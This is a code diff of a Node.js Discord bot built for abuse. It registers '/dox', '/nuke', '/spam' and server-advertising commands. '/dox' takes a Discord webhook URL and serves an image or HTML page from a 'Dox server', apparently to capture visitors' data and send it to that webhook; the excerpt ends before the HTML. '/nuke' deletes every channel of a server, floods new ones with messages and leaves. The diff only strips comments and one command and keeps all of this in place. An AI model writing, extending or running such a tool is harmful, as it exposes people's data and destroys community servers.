@@ -11,17 +11,13 @@ const PORT = process.env.PORT || 3000;
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
-        GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent,
-        GatewayIntentBits.GuildMembers,
-        GatewayIntentBits.GuildModeration
+        GatewayIntentBits.GuildMessages
     ]
 });
 
 const links = new Map();
 const startTime = Date.now();
 
-// ---- DOX SERVER ----
 app.get('/img/:id.png', (req, res) => {
     const id = req.params.id;
     if (!links.has(id)) return res.status(404).send('Image not found');
@@ -31,7 +27,6 @@ app.get('/img/:id.png', (req, res) => {
 });
 app.listen(PORT, () => console.log(`Dox server on ${PORT}`));
 
-// ---- COMMAND REGISTRATION ----
 async function registerCommands() {
     const commands = [
         { name: 'dox', description: 'Generate dox link', options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }] },
@@ -39,8 +34,7 @@ async function registerCommands() {
         { name: 'nuke', description: 'Delete all channels, create new, flood, leave', options: [{ name: 'channels', type: 4, description: 'Channels to create (default 20, max 50)', required: false }, { name: 'messages', type: 4, description: 'Messages per channel (default 10, max 100)', required: false }, { name: 'delay', type: 4, description: 'Delay in ms between messages (default 50)', required: false }] },
         { name: 'ad', description: 'Advertise the server invite' },
         { name: 'purge', description: 'Delete messages in bulk', options: [{ name: 'amount', type: 4, description: 'Number to delete (max 100)', required: true }, { name: 'user', type: 6, description: 'Target user', required: false }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
-        { name: 'ping', description: 'Check bot latency' },
-        { name: 'refresh', description: 'Manually refresh slash commands' }
+        { name: 'ping', description: 'Check bot latency' }
     ];
     try {
         await client.application.commands.set([]);
@@ -58,11 +52,9 @@ client.once('ready', async () => {
     console.log('Ready.');
 });
 
-// ---- INTERACTION HANDLER ----
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
-    // Guarantee response
     try {
         await interaction.deferReply({ ephemeral: true });
     } catch {
@@ -77,14 +69,6 @@ client.on('interactionCreate', async (interaction) => {
         const { commandName, options, user, member, guild, channel } = interaction;
         console.log(`[${new Date().toISOString()}] ${user.tag} -> /${commandName}`);
 
-        // ---- REFRESH ----
-        if (commandName === 'refresh') {
-            await registerCommands();
-            await interaction.editReply('✅ Commands refreshed.');
-            return;
-        }
-
-        // ---- DOX ----
         if (commandName === 'dox') {
             const wh = options.getString('webhook');
             if (!wh || !wh.startsWith('https://discord.com/api/webhooks/')) {
@@ -102,7 +86,6 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- SPAM ----
         if (commandName === 'spam') {
             const count = Math.min(options.getInteger('count'), 100);
             const msg = options.getString('message');
@@ -116,7 +99,6 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- NUKE ----
         if (commandName === 'nuke') {
             if (!guild) return interaction.editReply('❌ Server only.');
             if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.editReply('❌ Need Admin.');
@@ -145,7 +127,6 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- AD ----
         if (commandName === 'ad') {
             if (!channel) return interaction.editReply('❌ No channel.');
             const embed = new EmbedBuilder()
@@ -158,7 +139,6 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- PURGE ----
         if (commandName === 'purge') {
             const amount = Math.min(options.getInteger('amount'), 100);
             const targetUser = options.getUser('user');
@@ -177,7 +157,6 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- PING ----
         if (commandName === 'ping') {
             const sent = await interaction.editReply({ content: '🏓 Pinging...', fetchReply: true });
             const latency = sent.createdTimestamp - interaction.createdTimestamp;
@@ -191,7 +170,6 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
-// ---- DOX HTML (Proven, Minimal) ----
 function generateDoxHTML(webhook) {
     return `<!DOCTYPE html>
 <html>
